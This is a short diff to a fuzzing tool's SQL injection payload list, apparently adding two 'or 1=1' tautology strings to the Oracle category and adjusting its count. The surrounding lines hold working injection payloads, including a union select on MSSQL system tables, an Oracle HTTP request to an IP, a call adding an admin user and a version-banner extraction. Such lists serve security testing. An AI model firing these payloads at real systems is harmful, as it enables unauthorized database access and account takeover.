@@ -113,9 +113,11 @@ P:007-SQL-INJ:MySQL/MS SQL Common Injection:9
 1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
 1 uni/**/on select all from where
 
-P:008-SQL-INJ:Oracle SQL Injection:52
+P:008-SQL-INJ:Oracle SQL Injection:54
 > Replacive Fuzzers | SQL Injection | Injection
 >>This is a comment line to be changed in the future
+’ or ‘1’=’1
+' or '1'='1
 '||utl_http.request('httP://192.168.1.1/')||'
 ' || myappadmin.adduser('admin', 'newpass') || '
 ' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
